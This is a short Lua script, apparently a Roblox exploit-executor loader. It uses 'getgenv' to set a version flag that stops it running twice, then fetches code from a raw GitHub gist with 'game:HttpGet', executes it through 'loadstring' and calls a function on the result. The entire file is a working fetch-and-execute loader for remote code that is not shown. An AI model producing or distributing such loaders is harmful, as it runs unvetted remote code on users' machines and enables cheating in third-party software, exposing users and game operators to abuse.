local VERSION = "1.0.5"

if getgenv()[VERSION] == true then
	task.wait(5)
	getgenv()[VERSION] = false
	return
end

getgenv()[VERSION] = true
loadstring(game:HttpGet("https://gist.github.com/dansi31/ad269f25b59a85b4e424359159a5472e/raw/40caed18bb4a5b3262d4fb15a7eb5d78aa9c410a/gistfile1.txt"))().CN()